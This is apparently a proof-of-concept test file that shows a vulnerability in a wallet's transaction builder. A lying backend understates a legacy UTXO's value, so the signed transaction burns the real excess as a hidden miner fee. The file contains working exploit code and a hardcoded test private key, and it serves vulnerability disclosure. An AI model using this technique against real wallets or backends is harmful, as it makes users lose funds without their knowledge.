// PoC ? a malicious/MITM'd backend that lies about a LEGACY UTXO's value
// (smaller than reality) makes the wallet compute change on the lie and burn
// the real excess to miner fee. No user error: the wallet reports the tiny
// claimed fee; the real fee is hidden.
//
// makeTx (keymanager.ts:1119) takes the coinselect/change amount from the
// backend-supplied `utxo.value` field. For a legacy (p2pkh) input the ECDSA
// sighash does NOT commit to the input amount, so the signature is valid on the
// real network regardless of the claimed value. Result: real_fee =
// real_prevout_value - outputs, where outputs were sized against the lie.

import { Transaction } from 'altcoin-js'
import { expect } from 'chai'
import { describe, it } from 'mocha'

import { info as bitcoin } from '../../../../../src/common/utxobased/info/bitcoin'
import {
  addressToScriptPubkey,
  AddressTypeEnum,
  makeTx,
  privateKeyEncodingToPubkey,
  pubkeyToScriptPubkey,
  scriptPubkeyToAddress,
  ScriptTypeEnum,
  signTx,
  wifToPrivateKeyEncoding
} from '../../../../../src/common/utxobased/keymanager/keymanager'

describe('PoC: lying-prevout legacy fee burn', function () {
  this.timeout(10000)

  const wifKey = 'L2uPYXe17xSTqbCjZvL2DsyXPCbXspvcu5mHLDYUgzdUbZGSKrSr'
  const privateKeyEncoding = wifToPrivateKeyEncoding({ wifKey, coin: 'bitcoin' })
  const scriptPubkey: string = pubkeyToScriptPubkey({
    pubkey: privateKeyEncodingToPubkey(privateKeyEncoding),
    scriptType: ScriptTypeEnum.p2pkh
  }).scriptPubkey
  const myAddress: string = scriptPubkeyToAddress({
    scriptPubkey,
    coin: 'bitcoin',
    addressType: AddressTypeEnum.p2pkh
  }).address

  // Real previous transaction whose vout 0 pays `scriptPubkey` a REAL value of
  // 0x015f90 = 90000 sats. (Reused from the repo's own legacy fixture.)
  const REAL_PREVOUT_VALUE = 90000
  const prevTxHex =
    '0200000001f9f34e95b9d5c8abcd20fc5bd4a825d1517be62f0f775e5f36da944d9' +
    '452e550000000006b483045022100c86e9a111afc90f64b4904bd609e9eaed80d48' +
    'ca17c162b1aca0a788ac3526f002207bb79b60d4fc6526329bf18a77135dc566020' +
    '9e761da46e1c2f1152ec013215801210211755115eabf846720f5cb18f248666fec' +
    '631e5e1e66009ce3710ceea5b1ad13ffffffff01' +
    '905f010000000000' + // 90000 sats, little-endian
    '19' +
    scriptPubkey +
    '00000000'

  it('burns the real UTXO excess to fee when the backend lies the value is small', async () => {
    const CLAIMED_VALUE = 2000 // malicious backend lie (real is 90000)
    const SEND_AMOUNT = 1000

    const { psbtBase64 } = makeTx({
      forceUseUtxo: [],
      coin: 'bitcoin',
      currencyCode: 'BTC',
      enableRbf: false,
      freshChangeAddress: myAddress,
      feeRate: 1, // honest low fee rate; the loss is from the value lie, not fee rate
      subtractFee: false,
      utxos: [
        {
          id: '0',
          scriptType: ScriptTypeEnum.p2pkh,
          txid:
            '7d067b4a697a09d2c3cff7d4d9506c9955e93bff41bf82d439da7d030382bc3e',
          scriptPubkey,
          value: String(CLAIMED_VALUE), // <-- the lie
          blockHeight: 1,
          spent: false,
          script: prevTxHex, // real prev-tx (encodes 90000)
          vout: 0
        }
      ],
      targets: [{ address: myAddress, value: SEND_AMOUNT }],
      memos: [],
      outputSort: 'bip69'
    })

    // Signing succeeds: legacy sighash does not commit to the input amount.
    const signedTx = await signTx({
      coin: 'bitcoin',
      feeInfo: bitcoin.engineInfo.defaultFeeInfo, // real maximumFeeRate cap in effect
      privateKeyEncodings: [privateKeyEncoding],
      psbtBase64
    })

    // Decode the signed tx and compute the REAL fee against the REAL prevout value.
    const tx = Transaction.fromHex(signedTx.hex)
    const totalOut = tx.outs.reduce((s, o) => s + o.value, 0)
    const realFee = REAL_PREVOUT_VALUE - totalOut
    const claimedFee = CLAIMED_VALUE - totalOut

    // eslint-disable-next-line no-console
    console.log(
      `\n  real prevout value : ${REAL_PREVOUT_VALUE}` +
        `\n  claimed value      : ${CLAIMED_VALUE}` +
        `\n  signed outputs sum : ${totalOut}` +
        `\n  fee wallet reports : ~${claimedFee} sats` +
        `\n  REAL fee on-chain  : ${realFee} sats  (burned to miner, hidden from user)\n`
    )

    // The attack: on-chain fee is the real excess, far above what the wallet showed.
    expect(realFee).to.be.greaterThan(80000)
    expect(realFee - claimedFee).to.equal(REAL_PREVOUT_VALUE - CLAIMED_VALUE)
  })
})
